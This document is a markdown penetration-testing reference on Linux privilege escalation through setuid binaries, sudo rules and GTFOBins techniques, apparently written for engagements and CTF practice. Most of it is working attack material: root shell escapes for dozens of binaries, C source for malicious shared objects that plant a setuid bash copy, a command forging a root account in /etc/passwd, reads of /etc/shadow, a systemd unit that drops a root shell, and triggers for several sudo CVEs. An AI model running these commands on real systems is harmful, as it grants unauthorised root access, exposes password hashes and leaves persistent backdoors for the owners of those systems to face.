# SUID/SGID, sudo & GTFOBins Exploitation

Deep reference for the three highest-yield Linux privesc vectors: setuid/setgid binaries, the `sudo` policy, and the GTFOBins technique catalog. Companion to `linux-privesc-methodology.md`.

---

## 1. How SUID/SGID Works

A file with the **setuid** bit (`chmod u+s`, octal `4000`) runs with the privileges of its **owner**, not the caller. If owned by root, the process executes as root. **setgid** (`2000`) does the same for the group. Privesc happens when such a binary either:

- *is* an interpreter / file utility that can be coerced into spawning a shell or reading/writing arbitrary files **as root**, or
- *calls* another program insecurely (relative path → `$PATH` hijack; loads a `.so` → `LD_*`/RPATH hijack).

```bash
# Find SUID / SGID
find / -perm -4000 -type f 2>/dev/null            # SUID
find / -perm -2000 -type f 2>/dev/null            # SGID
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null

# Diff against a clean baseline of the same distro to spot CUSTOM SUID binaries —
# custom binaries are where the bugs are.
```

> Note: `bash` only honors the SUID bit with `-p` (privileged mode) and only on certain builds; modern `dash`/`bash` may drop privileges unless invoked correctly. Always try `-p`.

---

## 2. SUID Binary Exploitation (GTFOBins by binary)

For each, the binary must carry the SUID root bit. Run `-p` shells to *keep* the elevated euid.

```bash
# --- Shells / interpreters ---
bash -p
dash -p          # often: ./somesuid then `dash -p`
ksh -p

# --- File search / archiving ---
find . -exec /bin/sh -p \; -quit
nice /bin/sh -p
# tar
tar xf /dev/null -I '/bin/sh -c "sh -p <&2 1>&2"'
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# cpio, rsync, zip/unzip — see GTFOBins per binary
zip x.zip /etc/hosts -T -TT 'sh -c "sh -p 0<&1"'
rsync -e 'sh -p -c "sh -p 0<&2 1>&2"' 127.0.0.1:/dev/null

# --- Editors / pagers ---
vim -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'
vim -c ':!/bin/sh -p'
less /etc/profile      # then  !/bin/sh -p
more /etc/profile      # then  !/bin/sh -p   (needs small terminal)
nano                   # ^R ^X then:  reset; sh 1>&0 2>&0

# --- Scripting languages ---
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
python  -c 'import os; os.setuid(0); os.system("/bin/sh")'    # works when euid=0
perl    -e 'exec "/bin/sh";'
ruby    -e 'exec "/bin/sh"'
lua     -e 'os.execute("/bin/sh")'
node    -e 'require("child_process").spawn("/bin/sh",["-p"],{stdio:[0,1,2]})'
php     -r "pcntl_exec('/bin/sh', ['-p']);"
awk 'BEGIN {system("/bin/sh")}'
gawk 'BEGIN {system("/bin/sh -p")}'

# --- Misc high-value ---
env /bin/sh -p
nmap --interactive            # legacy; then  !sh         (old nmap only)
echo 'os.execute("/bin/sh")' > /tmp/x.nse && nmap --script=/tmp/x.nse
git -p help config            # then  !/bin/sh
git branch --help config      # then  !/bin/sh
ftp                           # then  !/bin/sh
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
make -s --eval=$'x:\n\t-/bin/sh -p'
ip netns add x; ip netns exec x /bin/sh -p; ip netns delete x
```

### SUID binary that reads/writes files as root (no shell needed)
If the SUID binary can read arbitrary files → read `/etc/shadow`. If it can write → overwrite `/etc/passwd` or a SUID binary.
```bash
# Examples of "read primitive" SUID binaries:
cat /etc/shadow            # SUID cat/head/tail/cp
base64 /etc/shadow | base64 -d
# Write primitive → forge a root user
echo 'r00t:$(openssl passwd -6 pw):0:0::/root:/bin/bash' >> /etc/passwd
```

---

## 3. SUID Binaries Calling Other Programs (hijacks)

### 3.1 $PATH hijack (relative/bare command)
A custom SUID binary that calls e.g. `system("service apache2 start")` or `system("ps")` without an absolute path.
```bash
strings /path/to/suidbin | grep -E '^[a-z_/]+$'   # find called command names
# 'ps' is called by bare name → hijack it:
cd /tmp
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb' > ps
chmod +x ps
export PATH=/tmp:$PATH
/path/to/suidbin           # triggers our fake 'ps' as root
/tmp/rb -p
```

### 3.2 LD_PRELOAD / LD_LIBRARY_PATH (shared object injection)
Mostly applies via **sudo** with `env_keep` (see §5), but also custom SUID binaries with insecure RPATH.
```bash
# Find the missing/relative library a SUID binary loads:
ldd /path/to/suidbin                       # look for "not found" or ./relative paths
readelf -d /path/to/suidbin | grep -E 'RPATH|RUNPATH|NEEDED'
# Build a malicious lib matching the NEEDED name and place it in the RPATH dir.
```
Generic malicious shared object:
```c
// evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/rb; chmod +s /tmp/rb");
}
```
```bash
gcc -shared -fPIC -o evil.so evil.c
```

---

## 4. SGID Notes
SGID gives the binary's *group*. If that group can read sensitive files (e.g. `shadow`, `disk`, app secrets) you escalate laterally, not always to root directly.
```bash
find / -perm -2000 -type f 2>/dev/null
# SGID 'shadow' binary => can read /etc/shadow; SGID into a group owning a writable root cron, etc.
```

---

## 5. sudo Policy Abuse

`sudo -l` is the single most important enumeration command. Read it carefully for: the command list, `NOPASSWD`, `env_keep`, `SETENV`, `secure_path`, runas users (`(ALL)`, `(root)`, `(user)`), and wildcards.

```bash
sudo -l
sudo -l -l            # verbose (shows Defaults like env_keep, secure_path)
sudo --version        # check for sudo CVEs (Baron Samedit 1.9.5p2, sudoedit chroot CVE-2023-22809)
```

### 5.1 Trivial wins
```bash
sudo -i; sudo su; sudo /bin/bash; sudo bash -i      # if (ALL) ALL
sudo -u#-1 /bin/bash                                 # CVE-2019-14287 runas bypass (sudo<1.8.28, `(ALL,!root)`)
```

### 5.2 NOPASSWD GTFOBins (run the allowed binary as root)
Look up the exact binary on GTFOBins → `sudo` section. Highest-value:
```bash
sudo vim -c ':!/bin/sh'
sudo vim -c ':py3 import os; os.system("/bin/sh")'
sudo less /etc/profile        # then !/bin/sh
sudo more /etc/profile        # then !/bin/sh
sudo man man                  # then !/bin/sh
sudo awk 'BEGIN{system("/bin/sh")}'
sudo find . -exec /bin/sh \; -quit
sudo env /bin/sh
sudo nmap --script=/tmp/x.nse     # x.nse: os.execute('/bin/sh')
sudo perl -e 'exec "/bin/sh";'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo ruby -e 'exec "/bin/sh"'
sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
sudo apt-get changelog apt    # then !/bin/sh
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
sudo git -p help config       # then !/bin/sh
sudo git -c core.pager='!/bin/sh' -p log
sudo ftp                      # then !/bin/sh
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/x.sh -Z root   # x.sh = command file
sudo zip /tmp/z.zip /tmp/f -T --unzip-command="sh -c /bin/sh"
sudo install -m =xs $(which bash) /tmp/rb && /tmp/rb -p
sudo cp /bin/bash /tmp/rb && sudo chmod +s /tmp/rb && /tmp/rb -p   # if cp+chmod allowed
```

### 5.3 systemctl / service control
```bash
# sudo systemctl (NOPASSWD)
TF=$(mktemp).service
cat > $TF <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/sh -c "cp /bin/bash /tmp/rb; chmod +s /tmp/rb"
[Install]
WantedBy=multi-user.target
EOF
sudo systemctl link $TF
sudo systemctl enable --now $TF
/tmp/rb -p
# Or simpler, if a pager opens:
sudo systemctl       # opens pager → !sh
```

### 5.4 LD_PRELOAD / LD_LIBRARY_PATH via env_keep
If `sudo -l` shows `env_keep+=LD_PRELOAD` (or `SETENV`):
```c
// pre.c
#include <stdlib.h>
void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }
```
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/pre.so pre.c
sudo LD_PRELOAD=/tmp/pre.so <any allowed command>
```
LD_LIBRARY_PATH variant (point at a dir with a fake version of a library the allowed binary loads):
```bash
ldd $(which someallowedbin)          # find a library name to spoof
gcc -fPIC -shared -o /tmp/libXYZ.so.1 evil.c   # evil.c from §3.2
sudo LD_LIBRARY_PATH=/tmp someallowedbin
```

### 5.5 Wildcard / path injection in allowed command
```bash
# sudo allows:  /usr/bin/tar -czf /backup/* ...   (wildcard) → tar checkpoint injection
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > shell.sh; chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# when the sudo tar job runs over the dir → root

# sudoedit / editor CVE-2023-22809 (sudo 1.8.0–1.9.12p1):
EDITOR='vim -- /etc/sudoers' sudoedit /allowed/file   # edit arbitrary root-owned file
```

### 5.6 sudo CVEs to check by version
```bash
sudo --version
# 1.8.x  < 1.8.28        → CVE-2019-14287  (sudo -u#-1)
# 1.8.2 – 1.8.31p2 / 1.9.0–1.9.5p1 → CVE-2021-3156 Baron Samedit (heap overflow, sudoedit -s)
# 1.8.0 – 1.9.12p1       → CVE-2023-22809  (sudoedit EDITOR arg injection)
```

---

## 6. Verification & Cleanup

```bash
# Confirm root
id    # uid=0(root)
/tmp/rb -p; id

# Clean up artifacts on real engagements
rm -f /tmp/rb /tmp/*.so /tmp/*.service shell.sh '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'
sudo systemctl disable <unit> 2>/dev/null; rm -f $TF
```

---

## 7. Cheatsheet

```bash
# ENUM
find / -perm -4000 -type f 2>/dev/null
sudo -l; sudo --version

# SUID FAST WINS
find . -exec /bin/sh -p \; -quit
bash -p
python3 -c 'import os;os.execl("/bin/sh","sh","-p")'
vim -c ':!/bin/sh -p'

# SUDO FAST WINS
sudo -i
sudo vim -c ':!/bin/sh'
sudo env /bin/sh
sudo find . -exec /bin/sh \; -quit
sudo install -m =xs $(which bash) /tmp/rb; /tmp/rb -p

# LD_PRELOAD (env_keep)
gcc -fPIC -shared -nostartfiles -o /tmp/pre.so pre.c; sudo LD_PRELOAD=/tmp/pre.so <cmd>

# PATH HIJACK (custom SUID calling bare cmd)
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/CMD; chmod +x /tmp/CMD; PATH=/tmp:$PATH /path/suidbin
```

---

## References

- GTFOBins (the canonical catalog) — https://gtfobins.github.io/
- HackTricks – Linux SUID — https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid
- HackTricks – Sudo/Admin abuse — https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo
- sudo CVE-2021-3156 (Baron Samedit) — https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
- sudo CVE-2019-14287 — https://www.sudo.ws/security/advisories/minus_1_uid/
- sudoedit CVE-2023-22809 — https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf
